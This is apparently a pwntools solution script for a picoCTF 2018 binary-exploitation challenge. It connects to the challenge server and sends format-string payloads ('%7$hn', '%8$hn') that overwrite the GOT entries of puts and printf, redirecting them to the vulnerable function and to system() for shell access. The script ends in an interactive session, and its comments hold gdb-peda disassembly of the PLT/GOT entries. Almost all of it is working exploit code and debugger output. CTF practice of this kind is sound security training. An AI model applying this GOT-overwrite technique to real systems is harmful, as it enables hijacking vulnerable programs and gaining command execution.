from pwn import *

p = remote('2018shell2.picoctf.com', 22462)

payload = p32(0x0804a01c)
payload += '%{}x%7$hn'.format(str((0x080485ab & 0x0000ffff) - 4))

p.sendafter('input your message:', payload)

payload = p32(0x804a010+2)
payload += p32(0x804a010)
payload += '%{}x%7$hn'.format(str((0x08048460 >> 16) - 4 * 2))
payload += '%{}x%8$hn'.format(str((0x08048460 & 0x0000ffff) - (0x08048460 >> 16) ))


p.sendline(payload)
p.interactive()
p.close()


#                         WHERE                  WHAT
# write vuln to puts     0x0804a01c (puts)   -> 0x080485ab (vuln)
# write system to printf 0x0804a010 (printf) -> 00x8048460 (system)

# .got.plt

# gdb-peda$ x/3i 0x8048420
#    0x8048420 <printf@plt>:	jmp    DWORD PTR ds:0x804a010
#    0x8048426 <printf@plt+6>:	push   0x8
#    0x804842b <printf@plt+11>:	jmp    0x8048400
# gdb-peda$ x/wx 0x804a010
# 0x804a010:	0x08048426

# gdb-peda$ x/3i 0x8048450
#    0x8048450 <puts@plt>:	jmp    DWORD PTR ds:0x804a01c
#    0x8048456 <puts@plt+6>:	push   0x20
#    0x804845b <puts@plt+11>:	jmp    0x8048400
# gdb-peda$ x/wx 0x804a01c
# 0x804a01c:	0x08048456

# gdb-peda$ x/3i 0x8048460
#    0x8048460 <system@plt>:	jmp    DWORD PTR ds:0x804a020
#    0x8048466 <system@plt+6>:	push   0x28
#    0x804846b <system@plt+11>:	jmp    0x8048400
# gdb-peda$ x/wx 0x804a020
# 0x804a020:	0x08048466

# Dump of assembler code for function vuln:
#    0x080485ab <+0>:	push   ebp
#    0x080485ac <+1>:	mov    ebp,esp
#    0x080485ae <+3>:	push   edi
#    0x080485af <+4>:	sub    esp,0x94
#    0x080485b5 <+10>:	mov    eax,gs:0x14
#    0x080485bb <+16>:	mov    DWORD PTR [ebp-0xc],eax